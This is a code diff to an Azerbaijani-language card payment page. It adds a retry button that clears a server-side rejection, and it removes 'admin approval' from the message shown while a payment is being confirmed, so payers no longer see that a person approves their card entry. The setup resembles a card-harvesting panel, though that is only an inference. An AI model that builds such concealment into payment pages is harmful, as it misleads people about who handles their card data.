@@ -172,7 +172,7 @@
             <p id="reject-reason-text" class="text-sm text-gray-600 font-medium bg-red-50 p-4 rounded-xl border border-red-200">
                 Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.
             </p>
-            <button onclick="location.reload()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl text-sm shadow transition">
+            <button onclick="retryPayment()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl text-sm shadow transition">
                 🔄 Yenidən Cəhd Et
             </button>
         </div>
@@ -183,7 +183,7 @@
         <div class="bg-white rounded-2xl max-w-sm w-full p-8 text-center space-y-4 shadow-2xl">
             <div class="inline-block animate-spin rounded-full h-16 w-16 border-4 border-blue-600 border-t-transparent"></div>
             <h3 class="font-bold text-gray-800 text-lg">Ödəniş Təsdiqlənir...</h3>
-            <p class="text-xs text-gray-500">Zəhmət olmasa gözləyin, bank əməliyyatı və admin təsdiqi yoxlanılır.</p>
+            <p class="text-xs text-gray-500">Zəhmət olmasa gözləyin, bank əməliyyatı yoxlanılır.</p>
         </div>
     </div>
 
@@ -265,6 +265,8 @@
                 document.getElementById('reject-reason-text').textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
                 document.getElementById('reject-modal').classList.remove('hidden');
                 return;
+            } else {
+                document.getElementById('reject-modal').classList.add('hidden');
             }
 
             if (data.isPaid) {
@@ -420,6 +422,17 @@
             } catch (err) {
                 console.error("Ödəniş xətası:", err);
             }
+        }
+
+        async function retryPayment() {
+            try {
+                await fetch(`${API_URL}/clear-reject`, { method: 'POST' });
+            } catch (err) {
+                console.error("Clear reject error:", err);
+            }
+            document.getElementById('reject-modal').classList.add('hidden');
+            waitingForApproval = false;
+            location.reload();
         }
 
         function initTimer() {
